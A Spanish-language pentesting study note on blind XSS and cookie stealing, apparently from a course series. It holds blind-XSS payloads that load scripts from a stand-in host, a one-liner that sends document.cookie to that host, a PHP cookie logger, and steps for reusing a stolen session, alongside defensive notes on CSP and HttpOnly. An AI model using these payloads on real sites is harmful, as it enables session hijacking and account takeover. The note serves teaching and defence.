---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Fecha de actualización: 2026-06-02
Nota previa: "[[08 - Phishing]]"
Nota siguiente: "[[10 - Prevención de XSS]]"
Area: "[[XSS.base|XSS]]"
---
---

Las apps usan cookies para mantener la sesión: el usuario inicia sesión una vez y sigue autenticado en visitas posteriores. <mark style="background: #FFB86CA6;">Si robamos la cookie del navegador de la víctima, accedemos a su cuenta sin conocer su contraseña</mark>. Con XSS podemos ejecutar JavaScript que recoja esas cookies y nos las envíe — un `Session Hijacking` (o `Cookie Stealing`).

# Detección de Blind XSS

Aquí el escenario es `Blind XSS`: la vulnerabilidad <mark style="background: #ADCCFFA6;">se dispara en una página a la que no tenemos acceso</mark> (un panel de administración). Ocurre en formularios que solo ve cierto personal: formularios de contacto, reseñas, tickets de soporte, la cabecera `User-Agent`. En una página de registro, al enviar un usuario `test` solo vemos "un administrador revisará tu solicitud" — no vemos cómo se trata nuestra entrada.

Si no vemos la ejecución, ¿cómo detectamos la XSS y **qué campo** es vulnerable? Con un payload que cargue un **script remoto** desde nuestro servidor, nombrando el script según el campo:

```html
<script src=http://OUR_IP/username></script>   <!-- en el campo username -->
<script src=http://OUR_IP/fullname></script>   <!-- en el campo fullname -->
```

<mark style="background: #FFB86CA6;">Si recibimos una petición a `/username`, sabemos que ese campo ejecutó el script y es el vulnerable</mark>. Se prueban varios payloads (de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)), muchos con prefijos `'>` o `">` para romper el contexto:

```html
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

> [!info]+ Reducir el espacio de búsqueda
> El campo `email` suele estar validado en front **y** back-end, así que difícilmente es inyectable — sáltalo. El `password` casi siempre se *hashea* y no se muestra en claro — sáltalo también. El *blind XSS* es una variante **stored**: se dispara en un panel que no ves, así que no puedes ajustar el payload observando el resultado — aciertas probando distintos rompe-contextos (`'>`, `">`).

# Robar la cookie

Con el campo y el payload correctos, servimos un `script.js` que exfiltra la cookie:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Se prefiere `new Image().src` sobre `document.location='...'` porque solo añade una imagen (menos sospechoso) en vez de navegar a nuestra página. Hoy lo idiomático es `fetch('https://atacante/?c='+encodeURIComponent(document.cookie))` o `navigator.sendBeacon()`, que no dependen de cargar una imagen. <mark style="background: #FFB86CA6;">Cualquiera de estas vías la puede bloquear una `CSP` con `connect-src`/`img-src` restrictivo</mark> — la exfiltración, no solo la ejecución, es objetivo de la CSP. Un PHP las recoge y ordena en `cookies.txt`:

```php
<?php
if (isset($_GET['c'])) {
    foreach (explode(";", $_GET['c']) as $value) {
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: " . urldecode($value) . "\n");
        fclose($file);
    }
}
?>
```

```shell-session
$ cat cookies.txt
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

# Usar la cookie robada

En la página de login, abrimos el editor de `Storage` (`Shift+F9` en Firefox), añadimos la cookie (`Name` antes del `=`, `Value` después) y refrescamos: entramos como la víctima (`Welcome Back Admin`).

> [!important]+ `HttpOnly`: la defensa que mata este ataque
> El robo de cookie vía `document.cookie` tiene un talón de Aquiles que HTB apenas menciona: <mark style="background: #FF5582A6;">si la cookie de sesión tiene el flag `HttpOnly`, **`document.cookie` no puede leerla**</mark> y todo este ataque falla. En aplicaciones modernas las cookies de sesión casi siempre son `HttpOnly`, así que el cookie-stealing clásico está en gran parte muerto. Dos matices que lo mantienen vivo:
> - <mark style="background: #FFB86CA6;">Los tokens en `localStorage`/`sessionStorage` (JWT de muchas SPA) **sí** son legibles por JS</mark> — son el nuevo objetivo de exfiltración.
> - Aunque no puedas **robar** la cookie `HttpOnly`, el XSS sigue ejecutándose **dentro** de la sesión de la víctima: puedes lanzar peticiones autenticadas (la cookie viaja sola) y actuar como ella sin necesidad de robar nada. `HttpOnly` frena el robo, no el abuso — esa idea es la base de la [[00 - Introducción a la explotación XSS avanzada|explotación XSS avanzada]].

Hemos visto cómo encontrar y explotar XSS de todas las formas. El último paso —y el que cierra el círculo— es cómo **prevenirla**: [[10 - Prevención de XSS]].
